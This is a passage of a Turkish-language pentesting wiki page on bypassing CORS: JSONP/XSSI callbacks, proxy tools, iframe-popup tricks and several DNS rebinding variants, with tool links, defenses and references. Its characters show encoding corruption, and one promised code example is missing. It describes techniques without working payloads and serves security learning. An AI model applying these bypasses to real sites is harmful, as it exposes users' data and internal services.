XSSI, ayrÄ±ca Cross-Site Script Inclusion olarak da bilinen, aynÄ± kÃ¶ken politikasÄ±nÄ±n (SOP) script etiketi kullanÄ±larak kaynaklar dahil edildiÄŸinde geÃ§erli olmadÄ±ÄŸÄ±ndan faydalanÄ±lan bir zafiyet tÃ¼rÃ¼dÃ¼r. Bu, scriptlerin farklÄ± alanlardan dahil edilebilmesi gerektiÄŸi gerÃ§eÄŸinden yararlanÄ±r. Bu zafiyet, bir saldÄ±rganÄ±n script etiketi kullanÄ±larak dahil edilen herhangi bir iÃ§eriÄŸe eriÅŸmesine ve okumasÄ±na olanak tanÄ±r.

Bu zafiyet, Ã¶zellikle dinamik JavaScript veya JSONP (JSON with Padding) sÃ¶z konusu olduÄŸunda ve Ã¶zellikle Ã§erezler gibi Ã§evresel yetki bilgileri kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±ldÄ±ÄŸÄ±nda Ã¶nemli hale gelir. FarklÄ± bir ana bilgisayardan bir kaynak istendiÄŸinde Ã§erezler de dahil edilir ve saldÄ±rganÄ±n eriÅŸimine aÃ§Ä±k hale gelir.

Bu zafiyeti daha iyi anlamak ve hafifletmek iÃ§in, web uygulamalarÄ±nÄ±zda potansiyel XSSI zafiyetlerini belirlemeye ve ele almaya yardÄ±mcÄ± olabilecek BurpSuite eklentisini kullanabilirsiniz. [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) adresinde bulunan bu eklenti, web uygulamalarÄ±nÄ±zdaki XSSI zafiyetlerini belirlemeye ve ele almaya yardÄ±mcÄ± olabilir.

[**FarklÄ± XSSI tÃ¼rleri hakkÄ±nda ve bunlarÄ± nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸine dair daha fazla bilgi iÃ§in buraya tÄ±klayÄ±n.**](xssi-cross-site-script-inclusion.md)

Ä°steÄŸe bir **`callback`** **parametresi** eklemeyi deneyin. Belki sayfa, verileri JSONP olarak gÃ¶ndermek Ã¼zere hazÄ±rlanmÄ±ÅŸtÄ±r. Bu durumda sayfa, CORS politikasÄ±nÄ± atlayacak olan `Content-Type: application/javascript` ile verileri geri gÃ¶nderecektir.

![](<../.gitbook/assets/image (229).png>)

### Kolay (anlamsÄ±z?) atlatma

`Access-Control-Allow-Origin` kÄ±sÄ±tlamasÄ±nÄ± atlatmanÄ±n bir yolu, bir web uygulamasÄ±ndan sizin adÄ±nÄ±za bir istekte bulunmasÄ±nÄ± ve yanÄ±tÄ± geri gÃ¶ndermesini istemektir. Ancak, bu senaryoda, son kurbanÄ±n kimlik bilgileri farklÄ± bir alan adÄ±na yapÄ±lan istek nedeniyle gÃ¶nderilmez.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Bu araÃ§, isteÄŸinizi baÅŸlÄ±klarÄ±yla birlikte ileten bir proxy saÄŸlar ve aynÄ± zamanda Origin baÅŸlÄ±ÄŸÄ±nÄ± istenen alan adÄ±yla eÅŸleÅŸtirmek iÃ§in sahte bir Origin baÅŸlÄ±ÄŸÄ± oluÅŸturur. Bu, CORS politikasÄ±nÄ± etkili bir ÅŸekilde atlar. Ä°ÅŸte XMLHttpRequest ile kullanÄ±m Ã¶rneÄŸi:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Bu araÃ§, istekinizi olduÄŸu gibi iletmek yerine, sunucu belirtilen parametrelerle kendi isteÄŸini yapar.

### Iframe + Popup Atlatma

`e.origin === window.origin` gibi CORS denetimlerini atlatmak iÃ§in bir **iframe oluÅŸturarak** ve **ondan yeni bir pencere aÃ§arak** atlatma yapabilirsiniz. Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfaya bakÄ±n:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL AracÄ±lÄ±ÄŸÄ±yla DNS Rebinding

TTL aracÄ±lÄ±ÄŸÄ±yla DNS rebinding, DNS kayÄ±tlarÄ±nÄ± manipÃ¼le ederek belirli gÃ¼venlik Ã¶nlemlerini atlatmak iÃ§in kullanÄ±lan bir tekniktir. NasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ÅŸÃ¶yle aÃ§Ä±klayabiliriz:

1. SaldÄ±rgan bir web sayfasÄ± oluÅŸturur ve kurbanÄ±n buna eriÅŸmesini saÄŸlar.
2. SaldÄ±rgan daha sonra kendi alan adÄ±nÄ±n DNS (IP) adresini kurbanÄ±n web sayfasÄ±na yÃ¶nlendirir.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± DNS yanÄ±tÄ±nÄ± Ã¶nbelleÄŸe alÄ±r ve bu yanÄ±tÄ±n ne kadar sÃ¼reyle geÃ§erli olacaÄŸÄ±nÄ± belirten bir TTL (Time to Live) deÄŸeri olabilir.
4. TTL sÃ¼resi dolduÄŸunda, kurbanÄ±n tarayÄ±cÄ±sÄ± yeni bir DNS isteÄŸi yapar, bu da saldÄ±rganÄ±n kurbanÄ±n sayfasÄ±nda JavaScript kodunu yÃ¼rÃ¼tmesine olanak tanÄ±r.
5. SaldÄ±rgan, kurbanÄ±n IP'si Ã¼zerinde kontrolÃ¼ sÃ¼rdÃ¼rerek, kurbandan herhangi bir Ã§erezi kurban sunucusuna gÃ¶ndermeden bilgi toplayabilir.

Bu tekniÄŸin hemen kÃ¶tÃ¼ye kullanÄ±lmasÄ±nÄ± Ã¶nleyebilecek tarayÄ±cÄ±larda Ã¶nbellekleme mekanizmalarÄ± bulunmaktadÄ±r, hatta dÃ¼ÅŸÃ¼k TTL deÄŸerleriyle bile.

DNS rebinding, kurban tarafÄ±ndan gerÃ§ekleÅŸtirilen aÃ§Ä±k IP kontrollerini atlatmak veya bir kullanÄ±cÄ±nÄ±n veya botun aynÄ± sayfada uzun sÃ¼re kalmasÄ±na izin veren senaryolarda kullanÄ±ÅŸlÄ± olabilir, bu da Ã¶nbelleÄŸin sÃ¼resinin dolmasÄ±na izin verir.

HÄ±zlÄ± bir ÅŸekilde DNS rebinding'i kÃ¶tÃ¼ye kullanmanÄ±z gerekiyorsa, [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) gibi hizmetleri kullanabilirsiniz.

Kendi DNS rebinding sunucunuzu Ã§alÄ±ÅŸtÄ±rmak iÃ§in **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) gibi araÃ§larÄ± kullanabilirsiniz. Bu, yerel port 53/udp'nizi aÃ§Ä±ÄŸa Ã§Ä±karmanÄ±zÄ±, buna iÅŸaret eden bir A kaydÄ± oluÅŸturmanÄ±zÄ± (Ã¶rneÄŸin, ns.example.com), ve Ã¶nceden oluÅŸturulan A alt alan adÄ±na iÅŸaret eden bir NS kaydÄ± oluÅŸturmanÄ±zÄ± gerektirir (Ã¶rneÄŸin, ns.example.com). ns.example.com alt alanÄ±nÄ±n herhangi bir alt alanÄ± daha sonra ana bilgisayarÄ±nÄ±z tarafÄ±ndan Ã§Ã¶zÃ¼mlenir.

Daha fazla anlayÄ±ÅŸ ve deneyim iÃ§in [http://rebind.it/singularity.html](http://rebind.it/singularity.html) adresinde halka aÃ§Ä±k Ã§alÄ±ÅŸan bir sunucuyu keÅŸfedebilirsiniz.

### DNS Rebinding AracÄ±lÄ±ÄŸÄ±yla **DNS Ã–nbelleÄŸi SaldÄ±rÄ±sÄ±**

DNS rebinding aracÄ±lÄ±ÄŸÄ±yla DNS Ã¶nbelleÄŸi saldÄ±rÄ±sÄ±, tarayÄ±cÄ±larÄ±n Ã¶nbellekleme mekanizmasÄ±nÄ± atlatmak ve ikinci bir DNS isteÄŸi yapmaya zorlamak iÃ§in kullanÄ±lan baÅŸka bir tekniktir. NasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ÅŸÃ¶yle aÃ§Ä±klayabiliriz:

1. Ä°lk olarak, kurban bir DNS isteÄŸi yapar yapmaz, saldÄ±rganÄ±n IP adresiyle yanÄ±tlanÄ±r.
2. Ã–nbellek savunmasÄ±nÄ± atlatmak iÃ§in saldÄ±rgan bir hizmet iÅŸÃ§isi kullanÄ±r. Hizmet iÅŸÃ§isi, DNS Ã¶nbelleÄŸini doldurur ve bu da Ã¶nbelleÄŸe alÄ±nan saldÄ±rgan sunucu adÄ±nÄ± siler.
3. KurbanÄ±n tarayÄ±cÄ±sÄ± ikinci bir DNS isteÄŸi yapar yapmaz, artÄ±k genellikle yerel ana bilgisayarÄ± iÅŸaret eden IP adresi 127.0.0.1 ile yanÄ±tlanÄ±r.

Hizmet iÅŸÃ§isi aracÄ±lÄ±ÄŸÄ±yla DNS Ã¶nbelleÄŸini doldurarak, saldÄ±rgan DNS Ã§Ã¶zÃ¼mleme sÃ¼recini manipÃ¼le edebilir ve kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ± ikinci bir istek yapmaya zorlayabilir, bu sefer istenen saldÄ±rganÄ±n IP adresine Ã§Ã¶zÃ¼nmesini saÄŸlayabilir.

### DNS Rebinding AracÄ±lÄ±ÄŸÄ±yla **Ã–nbellek**

Ã–nbellek savunmasÄ±nÄ± atlatmanÄ±n baÅŸka bir yolu, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan adÄ± iÃ§in birden fazla IP adresini kullanmaktÄ±r. NasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ÅŸÃ¶yle aÃ§Ä±klayabiliriz:

1. SaldÄ±rgan, DNS saÄŸlayÄ±cÄ±sÄ±nda aynÄ± alt alan adÄ± iÃ§in iki A kaydÄ± (veya iki IP'li tek bir A kaydÄ±) oluÅŸturur.
2. TarayÄ±cÄ± bu kayÄ±tlarÄ± kontrol ettiÄŸinde, her iki IP adresini de alÄ±r.
3. TarayÄ±cÄ±, Ã¶nce saldÄ±rganÄ±n IP adresini kullanmaya karar verirse, saldÄ±rgan, aynÄ± alan adÄ±na HTTP istekleri gerÃ§ekleÅŸtiren bir yÃ¼k gÃ¶nderebilir.
4. Ancak saldÄ±rgan, kurbanÄ±n IP adresini elde ettikten sonra, kurbanÄ±n tarayÄ±cÄ±sÄ±na yanÄ±t vermekten vazgeÃ§er.
5. TarayÄ±cÄ±, alan adÄ±nÄ±n yanÄ±t vermediÄŸini fark edince, ikinci verilen IP adresini kullanmaya devam eder.
6. Ä°kinci IP adresine eriÅŸerek, tarayÄ±cÄ± AynÄ± KÃ¶ken PolitikasÄ±nÄ± (SOP) atlar ve saldÄ±rgan bu durumu kÃ¶tÃ¼ye kullanarak kurbandan bilgi toplayabilir ve dÄ±ÅŸarÄ±ya Ã§Ä±karabilir.

Bu teknik, bir alan adÄ± iÃ§in birden fazla IP adresi saÄŸlandÄ±ÄŸÄ±nda tarayÄ±cÄ±larÄ±n davranÄ±ÅŸÄ±nÄ± kullanÄ±r. YanÄ±tlarÄ± stratejik bir ÅŸekilde kontrol ederek ve tarayÄ±cÄ±nÄ±n IP adresi seÃ§imini manipÃ¼le ederek, bir saldÄ±rgan SOP'yi kÃ¶tÃ¼ye kullanabilir ve kurbandan bilgiye eriÅŸebilir.

{% hint style="warning" %}
Localhost'a eriÅŸmek iÃ§in Windows'ta **127.0.0.1** ve linux'ta **0.0.0.0**'Ä± yeniden baÄŸlamayÄ± denemelisiniz.\
Godaddy veya cloudflare gibi saÄŸlayÄ±cÄ±lar, 0.0.0.0 IP'sini kullanmama izin vermedi, ancak AWS route53, 2 IP'den birinin "0.0.0.0" olduÄŸu bir A kaydÄ± oluÅŸturmama izin verdi.

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Daha fazla bilgi iÃ§in [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) adresini kontrol edebilirsiniz.
### DiÄŸer YaygÄ±n Atlatmalar

* **Dahili IP'ler izin verilmiyorsa**, muhtemelen **0.0.0.0 yasaÄŸÄ± unutulmuÅŸ olabilir** (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* **Dahili IP'ler izin verilmiyorsa**, **localhost** iÃ§in bir **CNAME** ile yanÄ±t verin (Linux ve Mac'te Ã§alÄ±ÅŸÄ±r)
* **Dahili IP'ler izin verilmiyorsa** DNS yanÄ±tlarÄ±nda, www.corporate.internal gibi **dahili hizmetlere CNAME** yanÄ±tÄ± verebilirsiniz.

### DNS Yeniden Hedefleme SilahlandÄ±rÄ±lmÄ±ÅŸ

Ã–nceki atlatma teknikleri hakkÄ±nda daha fazla bilgiyi ve aÅŸaÄŸÄ±daki aracÄ± nasÄ±l kullanacaÄŸÄ±nÄ±zÄ± [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 KonferansÄ±](https://www.youtube.com/watch?v=y9-0lICNjOQ) adlÄ± sunumda bulabilirsiniz.

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity), [DNS yeniden hedefleme](https://en.wikipedia.org/wiki/DNS\_rebinding) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in bir araÃ§tÄ±r. SaldÄ±rÄ± sunucusunun DNS adÄ±nÄ±n IP adresini hedef makinenin IP adresine yeniden hedeflemek ve hedef makinedeki savunmasÄ±z yazÄ±lÄ±mlarÄ± sÃ¶mÃ¼rmek iÃ§in saldÄ±rÄ± yÃ¼klerini sunmak iÃ§in gerekli bileÅŸenleri iÃ§erir.

### DNS Yeniden Hedefleme KarÅŸÄ± GerÃ§ek Koruma

* Dahili hizmetlerde TLS kullanÄ±n
* Verilere eriÅŸim iÃ§in kimlik doÄŸrulama isteyin
* Host baÅŸlÄ±ÄŸÄ±nÄ± doÄŸrulayÄ±n
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Genel sunucularÄ±n dahili sunuculara eriÅŸmek istediÄŸinde her zaman bir Ã¶nceden uÃ§uÅŸ isteÄŸi gÃ¶ndermeyi Ã¶neren bir teklif

## **AraÃ§lar**

**CORS politikalarÄ±ndaki olasÄ± yapÄ±landÄ±rma hatalarÄ±nÄ± tarama**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referanslar

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)
